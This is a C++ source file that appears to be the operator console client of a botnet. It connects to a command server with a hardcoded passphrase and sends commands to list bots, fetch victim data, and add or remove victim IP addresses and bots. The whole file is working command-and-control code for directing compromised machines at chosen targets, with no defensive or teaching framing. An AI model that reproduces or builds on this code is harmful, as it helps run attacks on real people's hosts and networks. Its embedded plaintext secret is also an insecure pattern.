#include "manager.h"

manager::manager(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      server_ip_(server_ip),
      server_port_(server_port) {
	passphrase_ = "flk23f9f_f=fsd";

	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&manager::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&manager::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS_DATA]", boost::bind(&manager::handleGetBotsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	    {"[GET_VICTIMS_DATA]", boost::bind(&manager::handleGetVictimsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	};
	interactive_.get_bots_data_callback_ = boost::bind(&manager::getBotsData, this);
	interactive_.get_victims_data_callback_ = boost::bind(&manager::getVictimsData, this);

	interactive_.remove_victim_callback_ = boost::bind(&manager::removeVictim, this, boost::placeholders::_1);
	interactive_.remove_bot_callback_ = boost::bind(&manager::removeClient, this, boost::placeholders::_1);

	interactive_.add_victim_callback_ = boost::bind(&manager::addVictim, this, boost::placeholders::_1);
}

void manager::start() {
	tcp::socket socket(io_context_);
	socket_ = std::move(socket);

	err error;
	tcp::endpoint endpoint(io::ip::make_address(server_ip_), server_port_);

	socket_->connect(endpoint, error);

	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));
	server->start(boost::bind(&manager::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));

	std::vector<std::string> output_params = {passphrase_};
	std::string command = "[INIT]";
	server->send(msg_parser_.genCommand(command, output_params));
	server->read();
}

void manager::handleResponse(std::string& query, session* manager) {
	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], manager);
}

void manager::handleAlive(std::string& command, std::vector<std::string>& params, session* server) {
	std::vector<std::string> output_params = {"1"};
	server->send(msg_parser_.genCommand(command, output_params));
}

void manager::handleInit(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	if (stoi(params[0])) {
		ui_start_ = std::async(std::launch::async, &user_interface::start, &interactive_);
	}
}

void manager::handleGetBotsData(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	interactive_.updateMainWindowMenu(params);
    interactive_.active_tab_ = command;
}

void manager::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	interactive_.updateMainWindowMenu(params);
    interactive_.active_tab_ = command;
}

void manager::getBotsData() {
	std::vector<std::string> output_params{passphrase_};
	std::string command = "[GET_BOTS_DATA]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

void manager::getVictimsData() {
	std::vector<std::string> output_params{passphrase_};
	std::string command = "[GET_VICTIMS_DATA]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

void manager::removeClient(std::string& bot_ip) {
	std::vector<std::string> output_params = {passphrase_, bot_ip};
	std::string command = "[DEL_BOT]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

void manager::removeVictim(std::string& bot_ip) {
	std::vector<std::string> output_params = {passphrase_, bot_ip};
	std::string command = "[DEL_VICTIM]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

void manager::addVictim(std::string& victim_ip) {
	std::vector<std::string> output_params = {passphrase_, victim_ip};
	std::string command = "[ADD_VICTIM]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

